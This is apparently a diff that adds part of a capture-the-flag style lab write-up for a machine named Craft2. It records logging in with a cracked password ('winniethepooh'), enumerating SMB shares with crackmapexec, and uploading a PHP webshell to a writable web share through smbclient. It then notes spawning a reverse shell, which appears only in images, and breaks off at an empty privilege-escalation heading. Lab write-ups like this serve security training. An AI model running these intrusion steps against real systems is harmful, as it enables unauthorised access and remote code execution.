@@ -70,7 +70,55 @@ let's try to crack the hash.
 
 cracked the password hash `winniethepooh`. `thecybergeek:winniethepooh`
 
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Craft2]
+└─$ crackmapexec smb 192.168.195.188 -u thecybergeek -p winniethepooh --shares
+SMB         192.168.195.188 445    CRAFT2           [*] Windows 10.0 Build 17763 x64 (name:CRAFT2) (domain:CRAFT2) (signing:False) (SMBv1:False)
+SMB         192.168.195.188 445    CRAFT2           [+] CRAFT2\thecybergeek:winniethepooh 
+SMB         192.168.195.188 445    CRAFT2           [-] Unexpected error with Neo4J
+SMB         192.168.195.188 445    CRAFT2           [-] Account not found on the domain
+SMB         192.168.195.188 445    CRAFT2           [*] Enumerated shares
+SMB         192.168.195.188 445    CRAFT2           Share           Permissions     Remark
+SMB         192.168.195.188 445    CRAFT2           -----           -----------     ------
+SMB         192.168.195.188 445    CRAFT2           ADMIN$                          Remote Admin
+SMB         192.168.195.188 445    CRAFT2           C$                              Default share
+SMB         192.168.195.188 445    CRAFT2           IPC$            READ            Remote IPC
+SMB         192.168.195.188 445    CRAFT2           WebApp          READ 
+```
+using `CME` to check for access, we got share on smb. 
 
 
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Craft2]
+└─$ smbclient //192.168.195.188/WebApp/ -U thecybergeek 
+Password for [WORKGROUP\thecybergeek]:
+Try "help" to get a list of possible commands.
+smb: \> dir 
+  .                                   D        0  Tue Apr  5 17:16:03 2022
+  ..                                  D        0  Tue Apr  5 17:16:03 2022
+  assets                              D        0  Tue Apr  5 17:16:03 2022
+  css                                 D        0  Tue Apr  5 17:16:03 2022
+  index.php                           A     9768  Mon Jan 31 17:21:52 2022
+  js                                  D        0  Tue Apr  5 17:16:03 2022
+  upload.php                          A      896  Mon Jan 31 16:23:02 2022
+  uploads                             D        0  Fri Mar  1 22:35:47 2024
+
+                10327807 blocks of size 4096. 1582745 blocks available
+smb: \> put shell.php 
+putting file shell.php as \shell.php (0.7 kb/s) (average 0.7 kb/s)
+smb: \> 
+```
+we login to the share and we also have file upload. we uploaded a `php` webshell. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/99f7f31f-8f23-42bd-ab33-522277a1faea)
+
+we trigger the web shell. let's spawn a reverse shell. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/618f5ed8-f21f-4c91-b5bf-7a6aad3d7efb)
+
+we spawn a reverse shell. 
+
+
+## Privilege escalation 
 
 
